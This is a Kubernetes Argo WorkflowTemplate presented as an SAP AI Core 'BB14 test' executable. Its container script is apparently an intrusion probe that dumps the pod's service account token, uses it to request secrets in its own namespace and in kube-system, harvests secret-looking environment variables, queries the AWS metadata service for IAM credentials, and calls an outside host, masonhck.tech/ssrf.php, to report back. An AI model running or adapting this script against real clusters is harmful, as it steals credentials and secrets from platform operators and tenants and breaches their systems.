apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "33.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V33 K8S DEEP PROBE ==="
        echo "=== $(date -u) ==="

        # 1. Service Account Token
        echo "=== SERVICE ACCOUNT TOKEN ==="
        if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
          echo "SA token exists: $(wc -c < /var/run/secrets/kubernetes.io/serviceaccount/token) bytes"
          cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 200
          echo "..."
          echo "Namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
          echo "CA cert: $(ls -la /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null)"
        else
          echo "No SA token mounted"
          find / -name "token" -path "*/serviceaccount/*" 2>/dev/null | head -5
        fi

        # 2. K8s API from inside pod
        echo "=== K8S API ACCESS ==="
        KUBE_API="https://kubernetes.default.svc"
        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        if [ -n "$SA_TOKEN" ]; then
          echo "Testing K8s API..."
          # Self info
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$KUBE_API/api/v1/namespaces" 2>&1 | head -c 500
          echo ""
          # Own namespace secrets
          NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
          echo "Namespace: $NS"
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$KUBE_API/api/v1/namespaces/$NS/secrets" 2>&1 | head -c 500
          echo ""
          # Cross-namespace
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$KUBE_API/api/v1/namespaces/kube-system/secrets" 2>&1 | head -c 200
          echo ""
          # Pods in namespace
          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$KUBE_API/api/v1/namespaces/$NS/pods" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f'  {p[\"metadata\"][\"name\"]}') for p in d.get('items',[])]" 2>/dev/null | head -20
        fi

        # 3. Environment variables (may contain secrets)
        echo "=== ENVIRONMENT ==="
        env | sort | grep -iE "key|secret|token|pass|auth|url|host|api|kube|argo|sap|aws|azure" | head -30

        # 4. Mounted volumes and secrets
        echo "=== MOUNTS ==="
        mount | grep -v "proc\|sys\|dev\|overlay" | head -20
        echo "=== /etc secrets ==="
        ls -la /etc/secrets/ 2>/dev/null || echo "No /etc/secrets"
        ls -la /etc/config/ 2>/dev/null || echo "No /etc/config"
        
        # 5. Network from inside
        echo "=== NETWORK ==="
        ip addr 2>/dev/null | grep inet | head -5
        echo "DNS config:"
        cat /etc/resolv.conf 2>/dev/null
        echo "Hosts:"
        cat /etc/hosts 2>/dev/null

        # 6. /proc exploration
        echo "=== PROC ==="
        cat /proc/self/cgroup 2>/dev/null | head -5
        echo "Capabilities: $(cat /proc/self/status 2>/dev/null | grep -i cap)"
        
        # 7. IMDS check (AWS)
        echo "=== IMDS ==="
        curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 200
        echo ""
        # IMDSv2
        IMDS_TOKEN=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
        if [ -n "$IMDS_TOKEN" ]; then
          echo "IMDSv2 token obtained!"
          curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 300
        fi

        # 8. Argo Workflows API
        echo "=== ARGO ==="
        curl -sk --connect-timeout 3 "https://localhost:2746/api/v1/workflows" 2>&1 | head -c 200
        curl -sk --connect-timeout 3 "http://argo-server.argo.svc:2746/api/v1/workflows" 2>&1 | head -c 200

        # 9. Callback with results
        echo "=== CALLBACK ==="
        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
        curl -s "https://www.masonhck.tech/ssrf.php?src=sap-probe-v33&ns=$NS" 2>&1 | head -c 50

        echo "=== V33 DONE $(date -u) ==="
